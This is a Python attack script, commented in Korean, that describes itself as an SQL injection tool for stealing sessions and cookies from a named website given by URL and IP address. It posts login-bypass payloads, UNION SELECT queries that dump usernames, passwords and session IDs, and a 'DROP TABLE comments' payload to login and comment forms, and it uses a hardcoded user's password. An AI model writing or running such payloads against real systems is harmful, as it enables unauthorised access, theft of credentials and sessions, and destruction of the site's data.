#!/usr/bin/env python3
"""
SQL Injection Scanner - 세션 테이블 덤프
XSS 대신 SQLi로 쿠키/세션 탈취
"""

import requests
import time
import sys

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

class SQLiScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })

    def test_login_sqli(self):
        """로그인 폼 SQL Injection 테스트"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[1] 로그인 SQL Injection 테스트{Colors.END}\n")

        payloads = [
            ("admin' OR '1'='1", "anything"),
            ("admin' OR '1'='1' --", "anything"),
            ("admin' OR '1'='1' #", "anything"),
            ("' OR 1=1 --", "' OR 1=1 --"),
            ("admin' --", "anything"),
            ("' UNION SELECT NULL, username, password FROM users --", "anything"),
            ("' UNION SELECT NULL, session_id, user_id FROM sessions --", "anything"),
        ]

        for username, password in payloads:
            print(f"{Colors.YELLOW}Testing:{Colors.END} {username[:50]}")

            try:
                data = {'username': username, 'password': password}
                response = self.session.post(
                    f"{self.base_url}/login.php",
                    data=data,
                    allow_redirects=True,
                    timeout=10
                )

                if 'index.php' in response.url or 'dashboard' in response.text.lower():
                    print(f"{Colors.GREEN}✓ SQLi 성공! 로그인 우회됨!{Colors.END}")
                    print(f"  URL: {response.url}")
                    print(f"  Response length: {len(response.text)}\n")
                    return True
                elif 'error' in response.text.lower() and 'sql' in response.text.lower():
                    print(f"{Colors.YELLOW}⚠ SQL 에러 감지 - SQLi 가능성 있음{Colors.END}")
                    print(f"  Response snippet: {response.text[:200]}\n")
                else:
                    print(f"{Colors.RED}✗ 실패{Colors.END}\n")

            except Exception as e:
                print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")

            time.sleep(1)

        return False

    def test_comment_sqli(self):
        """댓글 SQL Injection 테스트"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[2] 댓글 SQL Injection 테스트{Colors.END}\n")

        # 먼저 정상 로그인
        data = {'username': 'alice', 'password': 'alice2024'}
        self.session.post(f"{self.base_url}/login.php", data=data, allow_redirects=True)

        payloads = [
            "test' OR '1'='1",
            "test'; DROP TABLE comments; --",
            "test' UNION SELECT username, password FROM users --",
            "test' UNION SELECT NULL, session_id, user_id FROM sessions WHERE user_id=1 --",
            "test' AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns --",
        ]

        for payload in payloads:
            print(f"{Colors.YELLOW}Testing:{Colors.END} {payload[:50]}")

            try:
                data = {'post_id': 1, 'content': payload}
                response = self.session.post(
                    f"{self.base_url}/add_comment.php",
                    data=data,
                    allow_redirects=True,
                    timeout=10
                )

                if 'error' in response.text.lower() and 'sql' in response.text.lower():
                    print(f"{Colors.GREEN}✓ SQL 에러 감지 - SQLi 취약점 발견!{Colors.END}")
                    print(f"  {response.text[:200]}\n")
                    return True
                elif response.status_code == 200:
                    print(f"{Colors.BLUE}→ 200 OK (응답 확인 필요){Colors.END}\n")
                else:
                    print(f"{Colors.RED}✗ {response.status_code}{Colors.END}\n")

            except Exception as e:
                print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")

            time.sleep(1)

        return False

    def test_post_id_sqli(self):
        """post_id 파라미터 SQL Injection"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[3] post_id SQL Injection 테스트{Colors.END}\n")

        # 로그인
        data = {'username': 'alice', 'password': 'alice2024'}
        self.session.post(f"{self.base_url}/login.php", data=data, allow_redirects=True)

        payloads = [
            "1' OR '1'='1",
            "1 UNION SELECT username, password FROM users --",
            "1 UNION SELECT NULL, session_id FROM sessions --",
            "-1 UNION SELECT 1,2,3,4,5 --",
        ]

        for payload in payloads:
            print(f"{Colors.YELLOW}Testing:{Colors.END} {payload[:50]}")

            try:
                data = {'post_id': payload, 'content': 'test'}
                response = self.session.post(
                    f"{self.base_url}/add_comment.php",
                    data=data,
                    allow_redirects=True,
                    timeout=10
                )

                if 'error' in response.text.lower() and 'sql' in response.text.lower():
                    print(f"{Colors.GREEN}✓ SQL 에러 감지!{Colors.END}")
                    print(f"  {response.text[:200]}\n")
                    return True
                else:
                    print(f"{Colors.RED}✗ 실패{Colors.END}\n")

            except Exception as e:
                print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")

            time.sleep(1)

        return False

def main():
    print(f"\n{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}🗡️  SQL Injection Scanner - 세션 탈취{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}\n")

    TARGET = "http://healthmash.net"

    print(f"{Colors.BLUE}Target: {TARGET}{Colors.END}")
    print(f"{Colors.BLUE}IP: 54.180.32.176{Colors.END}\n")

    scanner = SQLiScanner(TARGET)

    # 테스트 실행
    scanner.test_login_sqli()
    scanner.test_comment_sqli()
    scanner.test_post_id_sqli()

    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📊 스캔 완료{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ 중단됨{Colors.END}")
        sys.exit(0)
